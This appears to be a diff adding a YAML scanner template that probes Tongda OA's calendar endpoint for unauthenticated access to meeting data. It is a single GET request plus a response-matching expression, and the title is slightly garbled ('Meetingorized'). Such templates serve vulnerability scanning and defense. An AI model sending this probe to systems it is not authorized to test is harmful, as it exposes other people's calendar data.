@@ -1,0 +1,25 @@
+id: poc-yaml-tongda-meeting-unauthorized-access
+info:
+  name: Tongda Meetingorized Access 未授权访问漏洞
+  severity: high
+  tags:
+  - 访问控制错误
+  finger: Tongda Meetingorized
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /general/calendar/arrange/get_cal_list.php?starttime=1548058874&endtime=33165447106&view=agendaDay
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like
+      Gecko) Chrome/62.0.3202.9 Safari/537.36
+    Accept-Encoding: deflate
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
+    "json") && contains(body, "creator") && contains(body, "originalTitle")
+  output: []
